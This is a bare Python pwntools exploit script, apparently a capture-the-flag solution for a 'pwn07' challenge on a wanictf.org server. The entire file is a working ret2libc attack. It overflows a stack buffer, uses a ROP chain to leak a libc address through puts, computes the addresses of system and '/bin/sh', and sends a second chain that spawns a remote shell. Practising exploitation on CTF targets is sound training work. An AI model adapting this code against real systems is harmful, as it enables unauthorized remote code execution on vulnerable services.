from pwn import *
#r = process("./pwn07")
r = remote("rce.wanictf.org", 9007)
elf = ELF("./pwn07")
#libc = elf.libc
libc = ELF("./libc-2.27.so")
ret= 0x400626
pop_rdi = 0x400a13
main = 0x4007a7
payload = "a" * 22 + p64(pop_rdi) + p64(elf.got['write']) + p64(elf.plt['puts']) + p64(main)
r.sendline(payload)
r.recvuntil("***end stack dump***\n")
r.recvuntil("\n")
leak = (u64(r.recv(6) + "\x00\x00"))
libc_base = leak - libc.symbols['write']
system = libc_base + libc.symbols['system']
binsh = libc_base + list(libc.search("/bin/sh"))[0]
oneshot = libc_base + 0x4f3d5
r.sendline("a" * 22 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))
r.interactive()

